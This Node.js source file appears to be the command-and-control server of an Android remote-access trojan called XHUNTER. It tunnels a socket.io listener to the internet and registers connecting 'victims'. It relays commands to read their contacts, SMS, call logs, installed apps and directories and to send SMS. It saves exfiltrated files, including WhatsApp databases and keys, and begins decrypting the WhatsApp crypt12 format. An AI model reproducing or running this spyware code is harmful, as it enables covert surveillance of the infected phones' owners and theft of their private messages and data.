var rn_bridge = require('rn-bridge');
var fs = require('fs');
const localtunnel = require('localtunnel');
const express = require('express');
const app = express()
const server = require('http').createServer(app)
const { Server } = require('socket.io')
const io = new Server(server, {
  maxHttpBufferSize: 1e8, // 100mb
});

var tunnel;
var victimList={};
var deviceList={};
const port = 8080;

const startListener=(subdomain)=>{
server.listen(port, (err) => {
    if (err) return;
    (async () => {
      tunnel = await localtunnel({ port: 8080, subdomain });
      rn_bridge.channel.post('listnerStarted');
      log("URL =>  " + tunnel.url);
      })();
});
io.on('connection', (socket) => {
    socket.on('join',(device)=>{
      log("Victim joined => "+JSON.stringify(device.id));
      victimList[device.id] =  socket.id;
      deviceList[socket.id] =  {
        "id":  device.id,
        "model":  device.model
      }
      rn_bridge.channel.post('deviceJoined',JSON.stringify(device));
    });
    socket.on('getDir',(data)=>{
      rn_bridge.channel.post('getDir',JSON.stringify(data));
    });
    socket.on('getInstalledApps',(data)=>{
      rn_bridge.channel.post('getInstalledApps',JSON.stringify(data));
    });
    socket.on('getContacts',(data)=>{
      rn_bridge.channel.post('getContacts',JSON.stringify(data));
    });
    socket.on('sendSMS',(data)=>{
      rn_bridge.channel.post('sendSMS',JSON.stringify(data));
    });
    socket.on('getCallLog',(data)=>{
      rn_bridge.channel.post('getCallLog',JSON.stringify(data));
    });
   
    socket.on("download", (d, callback) => {
      if(fs.existsSync(`/storage/emulated/0/XHUNTER`)){
        if(fs.existsSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`)){
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('download',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
            setTimeout(()=>{
              callback("success")
            },2000)
          });
        }else{
          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('download',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
            setTimeout(()=>{
              callback("success")
            },2000)
          });
        }
      }else{
          fs.mkdirSync(`/storage/emulated/0/XHUNTER`);
          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('download',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
            setTimeout(()=>{
              callback("success")
            },2000)
          });
      }
    });


    socket.on("downloadWhatsappDatabase", (d, callback) => {
      if(fs.existsSync(`/storage/emulated/0/XHUNTER`)){
        if(fs.existsSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`)){
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('downloadWhatsappDatabase',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
            setTimeout(()=>{
              callback("success")
            },2000)
          });
        }else{
          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('downloadWhatsappDatabase',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
            setTimeout(()=>{
              callback("success")
            },2000)
          });
        }
      }else{
          fs.mkdirSync(`/storage/emulated/0/XHUNTER`);
          fs.mkdirSync(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})`);
          fs.appendFile(`/storage/emulated/0/XHUNTER/${deviceList[socket.id].model} (${deviceList[socket.id].id})/${d.fileName}`, Buffer.from(d.fileData), function (err) {
            if (err) log(err);
            rn_bridge.channel.post('downloadWhatsappDatabase',JSON.stringify(Math.round((d.fileUploadedSize*100)/d.fileSize)));
            setTimeout(()=>{
              callback("success")
            },2000)
          });
      }
     });

     
    socket.on("downloadWhatsappKey", (d, callback) => {
      fs.appendFile(`/storage/emulated/0/${d.fileName}`, Buffer.from(d.fileData), function (err) {
        if (err) log(err);
        callback("success")
      });
      //rn_bridge.channel.post('downloadWhatsappKey',JSON.stringify(fileData));
     });
    socket.on("previewImage", (fileData) => {
      rn_bridge.channel.post('previewImage',JSON.stringify(fileData));
     });
    socket.on("error", (data) => {
      rn_bridge.channel.post('error',JSON.stringify(data));
     });
     socket.on("getSMS", (data) => {
      rn_bridge.channel.post('getSMS',JSON.stringify(data));
     });
    socket.on('disconnect', () => {
      log('Victim Disconnected !'+ socket.id)
      Object.keys(victimList).map((key)=>{
        if(victimList[key] === socket.id){
          rn_bridge.channel.post('deviceDisconnected',key);
        }
      })
      
    });
  })
}//startListener function close 

const send =(d)=>{
  let { to, action, data } = JSON.parse(d);
  log("sending to "+ to +" < -- >"+victimList[to]+" : "+action);
  io.to(victimList[to]).emit(action, data);
}

const decrypt =(d)=>{
  log(JSON.parse(d));
  let { databaseFilename, keyFilename,} = JSON.parse(d);
  var crypt12 = fs.readFileSync(databaseFilename);
  var keyfile = fs.readFileSync(keyFilename);
  var iv = crypt12.slice(67, 83);
  var key = keyfile.slice(126, 158);
  var crypted = crypt12.slice(190, crypt12.length);

}

const stopListener =()=>{
  server.close();
  tunnel.close();
  log("Server stopped")
}

rn_bridge.channel.on('startListener', (arg) => {
  try {
    startListener(arg)
  } catch (err) {
    log(JSON.stringify(err));
  }
});

rn_bridge.channel.on('cmd', (data) => {
  try {
    send(data)
  } catch (err) {
    log("Error: " + JSON.stringify(err) + " => " + err.stack );
  }
});

rn_bridge.channel.on('decrypt', (data) => {
  try {
    decrypt(data)
  } catch (err) {
    log("Error: " + JSON.stringify(err) + " => " + err.stack );
  }
});

rn_bridge.channel.on('stopListener', () => {
  try {
    stopListener()
  } catch (err) {
    log(JSON.stringify(err));
  }
});

const log = (log) =>{
  rn_bridge.channel.post('log',log);
}